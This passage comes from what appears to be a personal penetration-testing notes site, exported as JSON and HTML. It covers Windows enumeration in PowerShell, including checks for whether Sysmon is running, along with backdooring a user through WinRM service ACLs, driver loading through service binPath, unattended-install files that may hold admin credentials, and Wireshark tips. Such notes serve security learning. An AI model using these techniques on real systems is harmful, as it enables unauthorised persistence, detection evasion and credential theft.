style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.Connected&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# List all current Windows logs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-EventLog&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;List&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Sysmon is dangerous for an attacker! Three ways to check if&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# it&#039;s running...&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-Process&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; Where-Object&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;.ProcessName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; -eq&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Sysmon&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; }&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-CimInstance&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; win32_service &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Filter &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Description = &#039;System Monitor service&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-Service&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; where-object&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;.DisplayName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; -like&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;sysm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# List hidden directories&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-ChildItem&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;Hidden&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Path &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SOME_PATH&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Get a process with a particular &quot;image name&quot; (generally example.exe has an image name of &quot;example&quot;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-Process&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Name &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;IMAGE_NAME&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;When checking to see if Sysmon is running, you can also examine the &lt;code&gt;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon\\Operational&lt;/code&gt; Registry entry.&lt;/p&gt;\n&lt;h1 id=&quot;powershell-command-history&quot;&gt;PowerShell Command History&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#powershell-command-history&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;View PowerShell’s history.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;type &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Env:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;USERPROFILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Use %USERPROFILE% instead of &lt;code&gt;$Env:USERPROFILE&lt;/code&gt; if running from cmd.exe.&lt;/p&gt;"},"spells/Windows-service-ACLs":{"slug":"spells/Windows-service-ACLs","filePath":"spells/Windows service ACLs.md","title":"Windows service ACLs","links":["spells/Windows-Remote-Management"],"tags":["OS/Windows/Permissions","OS/Windows/Services","Protocol/WinRM","Application/PowerShell"],"content":"For connecting to services (such as WinRM), it’s often possible to manipulate the service ACL rather than the user’s privileges. For example, adding a user to the Microsoft.PowerShell security descriptor with the “Full Control” permission will enable access to the WinRM service, regardless of the permissions explicitly assigned to the user.\n# Note that the below PowerShell command will pull up a GUI ACL\n# configuration dialog\n#\nSet-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI\nThe advantage to manipulating user privileges and service ACLs directly is that it’s less obvious that a user is back-doored.","richContent":"&lt;p&gt;For connecting to services (such as &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-Remote-Management&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Windows-Remote-Management&quot;&gt;WinRM&lt;/a&gt;), it’s often possible to manipulate the service ACL rather than the user’s privileges. For example, adding a user to the &lt;code&gt;Microsoft.PowerShell&lt;/code&gt; security descriptor with the “Full Control” permission will enable access to the WinRM service, regardless of the permissions explicitly assigned to the user.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Note that the below PowerShell command will pull up a GUI ACL&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# configuration dialog&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Set-PSSessionConfiguration&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Name Microsoft.PowerShell &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;showSecurityDescriptorUI&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The advantage to manipulating user privileges and service ACLs directly is that it’s less obvious that a user is back-doored.&lt;/p&gt;"},"spells/Windows-services":{"slug":"spells/Windows-services","filePath":"spells/Windows services.md","title":"Windows services","links":[],"tags":["OS/Windows/Services","OS/Windows/Registry","OS/Windows/Drivers"],"content":"Note that Windows services need to use an additional set of API calls that are not normally implemented in regular executables. While it is possible to run a normal executable as a service, the command will not survive for long (making a stable reverse shell impossible) and will always registered as failed (potentially alerting defenders).\nService security\nService configurations are stored in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services; here the user is represented by the ObjectName value. DACLs are stored under each service as a Security sub-key.\nLoading drivers\nIf binPath points to a driver (.sys) rather than an executable, then that driver will be loaded into the kernel when the service is started!","richContent":"&lt;p&gt;Note that Windows services need to use an additional set of API calls that are not normally implemented in regular executables. While it &lt;em&gt;is&lt;/em&gt; possible to run a normal executable as a service, the command will not survive for long (making a stable reverse shell impossible) and will always registered as failed (potentially alerting defenders).&lt;/p&gt;\n&lt;h2 id=&quot;service-security&quot;&gt;Service security&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#service-security&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Service configurations are stored in the Registry under &lt;code&gt;HKLM\\SYSTEM\\CurrentControlSet\\Services&lt;/code&gt;; here the user is represented by the ObjectName value. DACLs are stored under each service as a Security sub-key.&lt;/p&gt;\n&lt;h2 id=&quot;loading-drivers&quot;&gt;Loading drivers&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#loading-drivers&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;If binPath points to a driver (.sys) rather than an executable, then that driver will be loaded into the kernel when the service is started!&lt;/p&gt;"},"spells/Windows-unattended-installation-data":{"slug":"spells/Windows-unattended-installation-data","filePath":"spells/Windows unattended installation data.md","title":"Windows unattended installation data","links":[],"tags":["OS/Windows","AttackCycle/Reconnaissance"],"content":"Unattended Windows installations still need an administrative account; credentials can be left in one of the following files (if not cleaned up):\n\nC:\\Unattend.xml\nC:\\Windows\\Panther\\Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattend.xml\nC:\\Windows\\system32\\sysprep.inf\nC:\\Windows\\system32\\sysprep\\sysprep.xml\n\nLook for the &lt;Credentials/&gt; block.","richContent":"&lt;p&gt;Unattended Windows installations still need an administrative account; credentials can be left in one of the following files (if not cleaned up):&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;C:\\Unattend.xml&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;C:\\Windows\\Panther\\Unattend.xml&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;C:\\Windows\\Panther\\Unattend\\Unattend.xml&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;C:\\Windows\\system32\\sysprep.inf&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;C:\\Windows\\system32\\sysprep\\sysprep.xml&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Look for the &lt;code&gt;&amp;#x3C;Credentials/&gt;&lt;/code&gt; block.&lt;/p&gt;"},"spells/Wireshark":{"slug":"spells/Wireshark","filePath":"spells/Wireshark.md","title":"Wireshark","links":["spells/TCP","spells/HTTP","spells/ARP","spells/TCP-header-flags"],"tags":["Application/Wireshark","Protocol/TCP","Protocol/HTTP","Protocol/ARP"],"content":"User interface\nTCP “conversations” (related packets) can be automatically filtered by right-clicking on a packet and selecting Conversation Filter → TCP (this matches all packets with the same source/destination IP/port). This really just automatically applies a filter.\nUse Statistics → Conversations to get a quick overview of the conversations in a packet capture. You can limit conversation statistics to the current filter view using the “Limit to display filter” checkbox.\nUse Statistics → Capture File Properties to see information about capture files (you can also include/save comments here!).\nThe packet list\nBy default, the “Time” column is in seconds and starts at zero (0) for the first packet captured. PCAP files actually include the full packet timestamp, so the format of the “Time” column can be changed using View → Time Display Format.\nWireshark adds some additional packet information, designated as [Wireshark Data]. Some examples:\n\nStream Index — The index of the streams/conversations displayed in the current filter, starting from 0.\nTCP Segment Length — The packet data length (this is useful for figuring out weird things, like SYN packets with data).\nConversation Completeness — A measure of how much of the current conversation/stream is present in the packet capture (for TCP conversations, Wireshark expects a handshake, some data, and then a FIN or RST).\n\nWireshark will also use these fields to note unusual TCP packet behaviors (such as the lack of an MSS option).\nWhen you select an ACK packet in Wireshark, a checkmark will be displayed next to the packet that is being acknowledged.\nIf you can find an encryption key in a packet dump, you can try applying them to encrypted packets in Wireshark using Preferences → RSA Keys.\nWireshark can easily extract files from HTTP conversations. To extract them from raw TCP streams, (1) locate the beginning of the stream, (2) right-click on the packet and select Follow → TCP Stream, (3) change “Show data as” to “Raw”, and (4) save it off using “Save As”.\nFiltering\n\nFilter on a negation using ! (for example, !arp filters out ARP packets).\nTo see SYN/ACK packets, filter with tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 1.\nTo search within packets use the filter frame contains &quot;$TEXT_TO_SEARCH&quot;.\n\nIf you click on a field for a packet, the filter name is displayed in the lower left. (For example, TCP SYN packets are tcp.flags.syn.) You can automatically apply a filter (or “prepare” a filter, which lets you see the filter before it’s applied) by right-clicking on it and choosing “Apply as Filter” (or “Prepare as Filter”).\nTo see (suspected) retransmissions in Wireshark, filter for the tcp.analysis.retransmission flag. Some retransmissions may be “fast”, in that the packet is transmitted before the TCP timer would have expired. This happens when SACK is used, typically after a packet isn’t acknowledged in after three consecutive SACK blocks.\nCustomization\nWireshark supports “profiles” (accessible in the lower right in the status bar) that are just collections of settings, filters, layouts, etc.\nWireshark allows filters to be saved for quick access; use the “+” button to the right of the filter bar. Drop-down menus can be created by separating menu components with // (for example, Menu//Submenu//Filter Name).\nProtocol names can be resolved in the Wireshark preferences by checking the Name Resolution → Resolve transport names option. IP address resolution is controlled using Name Resolution → Resolve network (IP) addresses. Wireshark can pull from either DNS querier in the packet capture itself, or from the resolver itself. Using an external resolver can get pretty noisy though.\nColor rules\nColor rules are just filters; they’re matched in order (from top down), with the first matched coloring rule applying. Note that Wireshark is not really consistent about applying new coloring rules — it’s best to reload the file after creating/modifying rules.","richContent":"&lt;h2 id=&quot;user-interface&quot;&gt;User interface&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#user-interface&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; “conversations” (related packets) can be automatically filtered by right-clicking on a packet and selecting &lt;strong&gt;Conversation Filter → TCP&lt;/strong&gt; (this matches all packets with the same source/destination IP/port). This really just automatically applies a filter.&lt;/p&gt;\n&lt;p&gt;Use &lt;strong&gt;Statistics → Conversations&lt;/strong&gt; to get a quick overview of the conversations in a packet capture. You can limit conversation statistics to the current filter view using the “Limit to display filter” checkbox.&lt;/p&gt;\n&lt;p&gt;Use &lt;strong&gt;Statistics → Capture File Properties&lt;/strong&gt; to see information about capture files (you can also include/save comments here!).&lt;/p&gt;\n&lt;h3 id=&quot;the-packet-list&quot;&gt;The packet list&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#the-packet-list&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;By default, the “Time” column is in seconds and starts at zero (0) for the first packet captured. PCAP files actually include the full packet timestamp, so the format of the “Time” column can be changed using &lt;strong&gt;View → Time Display Format&lt;/strong&gt;.&lt;/p&gt;\n&lt;p&gt;Wireshark adds some additional packet information, designated as &lt;code&gt;[Wireshark Data]&lt;/code&gt;. Some examples:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Stream Index — The index of the streams/conversations displayed in the current filter, starting from 0.&lt;/li&gt;\n&lt;li&gt;TCP Segment Length — The packet data length (this is useful for figuring out weird things, like SYN packets with data).&lt;/li&gt;\n&lt;li&gt;Conversation Completeness — A measure of how much of the current conversation/stream is present in the packet capture (for &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; conversations, Wireshark expects a handshake, some data, and then a FIN or RST).&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Wireshark will also use these fields to note unusual &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; packet behaviors (such as the lack of an MSS option).&lt;/p&gt;\n&lt;p&gt;When you select an ACK packet in Wireshark, a checkmark will be displayed next to the packet that is being acknowledged.&lt;/p&gt;\n&lt;p&gt;If you can find an encryption key in a packet dump, you can try applying them to encrypted packets in Wireshark using &lt;strong&gt;Preferences → RSA Keys&lt;/strong&gt;.&lt;/p&gt;\n&lt;p&gt;Wireshark can easily extract files from &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; conversations. To extract them from raw &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; streams, (1) locate the beginning of the stream, (2) right-click on the packet and select &lt;strong&gt;Follow → TCP Stream&lt;/strong&gt;, (3) change “Show data as” to “Raw”, and (4) save it off using “Save As”.&lt;/p&gt;\n&lt;h2 id=&quot;filtering&quot;&gt;Filtering&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#filtering&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;Filter on a negation using &lt;code&gt;!&lt;/code&gt; (for example, &lt;code&gt;!arp&lt;/code&gt; filters out &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ARP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ARP&quot;&gt;ARP&lt;/a&gt; packets).&lt;/li&gt;\n&lt;li&gt;To see SYN/ACK packets, filter with &lt;code&gt;tcp.flags.syn == 1 &amp;#x26;&amp;#x26; tcp.flags.ack == 1&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;To search within packets use the filter &lt;code&gt;frame contains &quot;$TEXT_TO_SEARCH&quot;&lt;/code&gt;.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;If you click on a field for a packet, the filter name is displayed in the lower left. (For example, &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-header-flags&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-header-flags&quot;&gt;TCP SYN&lt;/a&gt; packets are &lt;code&gt;tcp.flags.syn&lt;/code&gt;.) You can automatically apply a filter (or “prepare” a filter, which lets you see the filter before it’s applied) by right-clicking on it and choosing “Apply as Filter” (or “Prepare as Filter”).&lt;/p&gt;\n&lt;p&gt;To see (suspected) retransmissions in Wireshark, filter for the &lt;code&gt;tcp.analysis.retransmission&lt;/code&gt; flag. Some retransmissions may be “fast”, in that the packet is transmitted before the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; timer would have expired. This happens when SACK is used, typically after a packet isn’t acknowledged in after three consecutive SACK blocks.&lt;/p&gt;\n&lt;h2 id=&quot;customization&quot;&gt;Customization&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#customization&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Wireshark supports “profiles” (accessible in the lower right in the status bar) that are just collections of settings, filters, layouts, etc.&lt;/p&gt;\n&lt;p&gt;Wireshark allows filters to be saved for quick access; use the “+” button to the right of the filter bar. Drop-down menus can be created by separating menu components with &lt;code&gt;//&lt;/code&gt; (for example, &lt;code&gt;Menu//Submenu//Filter Name&lt;/code&gt;).&lt;/p&gt;\n&lt;p&gt;Protocol names can be resolved in the Wireshark preferences by checking the &lt;strong&gt;Name Resolution → Resolve transport names&lt;/strong&gt; option. IP address resolution is controlled using &lt;strong&gt;Name Resolution → Resolve network (IP) addresses&lt;/strong&gt;. Wireshark can pull from either 